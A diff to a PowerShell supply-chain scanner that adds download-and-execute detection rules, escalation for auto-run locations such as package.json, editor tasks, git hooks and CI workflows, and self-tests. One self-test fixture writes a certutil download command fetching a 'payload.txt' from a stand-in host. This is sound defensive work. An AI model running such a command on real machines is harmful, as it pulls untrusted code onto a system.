@@ -344,6 +344,18 @@ function Get-SupplyChainRules {
             }
         }
 
+        $v04RulesPath = Join-Path $PSScriptRoot "rules\v0.4\download-and-execute-rules.json"
+        if (Test-Path -LiteralPath $v04RulesPath -PathType Leaf) {
+            try {
+                $v04Rules = (Read-TextFile -Path $v04RulesPath) | ConvertFrom-Json
+                $rules | Add-Member -NotePropertyName "downloadAndExecutePatterns" -NotePropertyValue (ConvertTo-Array $v04Rules.downloadAndExecutePatterns) -Force
+                [void]$loadMessages.Add("Supplemental v0.4 download-and-execute rules loaded.")
+            }
+            catch {
+                [void]$loadMessages.Add("Supplemental v0.4 download-and-execute rules could not be loaded.")
+            }
+        }
+
         $rules | Add-Member -NotePropertyName "loadStatus" -NotePropertyValue "loaded" -Force
         $rules | Add-Member -NotePropertyName "loadMessage" -NotePropertyValue ($loadMessages -join " ") -Force
         return $rules
@@ -567,7 +579,7 @@ function Get-PathContext {
     if ($Path -match "(?i)[\\/]_selftest([\\/]|$)") {
         return "scanner-selftest"
     }
-    if ($Path -match "(?i)[\\/]rules[\\/](v0\.3[\\/])?(ioc-rules|contagious-interview-rules|safe-patterns)\.json$") {
+    if ($Path -match "(?i)[\\/]rules[\\/](v0\.3[\\/]|v0\.4[\\/])?(ioc-rules|contagious-interview-rules|safe-patterns|download-and-execute-rules)\.json$") {
         return "scanner-rule-file"
     }
     if ($Path -match "(?i)[\\/]Start-InvisiblePayloadScanner\.ps1$") {
@@ -1450,6 +1462,48 @@ function Add-LockfileVersionFindings {
     }
 }
 
+function Add-DownloadAndExecuteFindings {
+    param(
+        [System.Collections.Generic.List[object]]$Findings,
+        $Rules,
+        [string]$Path,
+        [string]$Text
+    )
+
+    if ([string]::IsNullOrEmpty($Text)) {
+        return
+    }
+
+    foreach ($candidate in (ConvertTo-Array $Rules.downloadAndExecutePatterns)) {
+        $pattern = [string]$candidate.pattern
+        if ([string]::IsNullOrWhiteSpace($pattern)) {
+            continue
+        }
+        $match = $null
+        try {
+            $match = [System.Text.RegularExpressions.Regex]::Match(
+                $Text,
+                $pattern,
+                [System.Text.RegularExpressions.RegexOptions]::IgnoreCase,
+                [TimeSpan]::FromSeconds(1)
+            )
+        }
+        catch {
+            continue
+        }
+        if (-not $match.Success) {
+            continue
+        }
+
+        $severity = "low"
+        if (Test-DocumentationPath -Path $Path) {
+            $severity = "info"
+        }
+        $pos = Get-LineColumn -Text $Text -Index $match.Index
+        $Findings.Add((New-Finding -Severity $severity -Category "download-and-execute" -Path $Path -Line $pos.line -Column $pos.column -Match ([string]$candidate.term) -Message "A classic download-and-execute or LOLBin command pattern was found." -Recommendation "Check whether this command runs automatically (install script, editor task, Git hook, CI workflow) before running the project." -Snippet (Get-TextSnippet -Text $Text -Index $match.Index -Length $match.Length)))
+    }
+}
+
 function Scan-SupplyChainFile {
     param(
         [System.Collections.Generic.List[object]]$Findings,
@@ -1460,6 +1514,7 @@ function Scan-SupplyChainFile {
 
     $text = Read-TextFile -Path $File.FullName
     Add-KnownIocFindings -Findings $Findings -Rules $Rules -Path $File.FullName -Text $text
+    Add-DownloadAndExecuteFindings -Findings $Findings -Rules $Rules -Path $File.FullName -Text $text
     Add-VscodeTaskFindings -Findings $Findings -Rules $Rules -Path $File.FullName -Text $text
     Add-ClaudeSettingsFindings -Findings $Findings -Rules $Rules -Path $File.FullName -Text $text
     Add-GitHubWorkflowFindings -Findings $Findings -Rules $Rules -RootPath $RootPath -Path $File.FullName -Text $text
@@ -1482,11 +1537,50 @@ function Scan-SupplyChainFile {
     }
 }
 
+function Test-AutoRunLocation {
+    param(
+        [string]$RootPath,
+        [string]$Path
+    )
+
+    $fileName = Split-Path -Leaf $Path
+    if ($fileName -eq "package.json") {
+        return $true
+    }
+
+    $relative = (Get-RelativePath -Root $RootPath -Path $Path).Replace("/", "\")
+    if ($relative -eq ".vscode\tasks.json" -or $relative -eq ".cursor\tasks.json") {
+        return $true
+    }
+    if ($relative -like ".husky\*" -or $relative -like ".githooks\*") {
+        return $true
+    }
+    if (($relative -like ".github\workflows\*") -and ((Get-GitHubWorkflowPathContext -RootPath $RootPath -Path $Path) -eq "github-workflow")) {
+        return $true
+    }
+    return $false
+}
+
 function Add-CompoundProjectFindings {
     param(
         [System.Collections.Generic.List[object]]$Findings,
         [string]$RootPath
     )
+
+    $autoRunDownloadExec = @($Findings | Where-Object {
+        $_.category -eq "download-and-execute" -and (Test-AutoRunLocation -RootPath $RootPath -Path ([string]$_.path))
+    })
+    if ($autoRunDownloadExec.Count -gt 0) {
+        $severity = "high"
+        $hasManifestOrTask = @($autoRunDownloadExec | Where-Object {
+            $name = Split-Path -Leaf ([string]$_.path)
+            $name -in @("package.json", "tasks.json")
+        })
+        if ($hasManifestOrTask.Count -gt 0) {
+            $severity = "critical"
+        }
+        $Findings.Add((New-Finding -Severity $severity -Category "compound-autorun-download-execute" -Path $RootPath -Match "download-and-execute in auto-run location" -Message "A download-and-execute command pattern sits in a location that can run automatically (install script, editor task, Git hook, or root CI workflow)." -Recommendation "Do not open this project as trusted or run install until the flagged auto-run files are reviewed."))
+    }
 
     $folderOpenInstallTasks = @($Findings | Where-Object { $_.category -eq "editor-folder-open-install-task" })
     if ($folderOpenInstallTasks.Count -lt 1) {
@@ -2285,6 +2379,9 @@ if ($SelfTest) {
     [System.IO.File]::WriteAllText((Join-Path $extensionRoot "package.json"), '{"name":"sample-extension","scripts":{"prepare":"pwsh ./prepare.ps1"}}', [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $nodeModulesPackageRoot "package.json"), '{"name":"suspicious-package","scripts":{"postinstall":"node -e console.log(1)"}}', [System.Text.Encoding]::UTF8)
     [System.IO.File]::WriteAllText((Join-Path $safePackageRoot "package.json"), '{"name":"safe-package","scripts":{"prepare":"husky install"}}', [System.Text.Encoding]::UTF8)
+    $toolsRoot = Join-Path $sampleRoot "tools"
+    New-Item -ItemType Directory -Force -Path $toolsRoot | Out-Null
+    [System.IO.File]::WriteAllText((Join-Path $toolsRoot "fetch.ps1"), 'certutil.exe -urlcache -split -f https://example.invalid/payload.txt payload.txt', [System.Text.Encoding]::UTF8)
 
     $supplySelf = Invoke-Scanner -Options ([pscustomobject]@{
         rootPath = $sampleRoot
@@ -2376,6 +2473,18 @@ if ($SelfTest) {
     $npmrcSnippetHit = @($supplySelf.results | Where-Object { (Split-Path -Leaf $_.path) -eq ".npmrc" -and $_.snippet -eq "[snippet hidden: sensitive file]" }).Count
     if ($npmrcSnippetHit -lt 1) {
         throw "Self-test failed: expected sensitive .npmrc snippet hiding."
+    }
+    $downloadExecLowHit = @($supplySelf.results | Where-Object { $_.category -eq "download-and-execute" -and $_.severity -eq "low" -and (Split-Path -Leaf $_.path) -eq "fetch.ps1" }).Count
+    if ($downloadExecLowHit -lt 1) {
+        throw "Self-test failed: expected v0.4 standalone download-and-execute finding to stay low."
+    }
+    $autoRunCompoundHit = @($supplySelf.results | Where-Object { $_.category -eq "compound-autorun-download-execute" -and $_.severity -in @("high", "critical") }).Count
+    if ($autoRunCompoundHit -lt 1) {
+        throw "Self-test failed: expected v0.4 compound auto-run download-and-execute escalation."
+    }
+    $nestedWorkflowAutoRunEscalation = @($supplySelf.results | Where-Object { $_.category -eq "download-and-execute" -and $_.path -like "*vendor*" -and $_.severity -notin @("low", "info") }).Count
+    if ($nestedWorkflowAutoRunEscalation -gt 0) {
+        throw "Self-test failed: nested workflow download-and-execute finding must not be escalated."
     }
     "Self-test passed: invisible=$($self.matchCount), supply=$($supplySelf.matchCount) match(es)."
     }
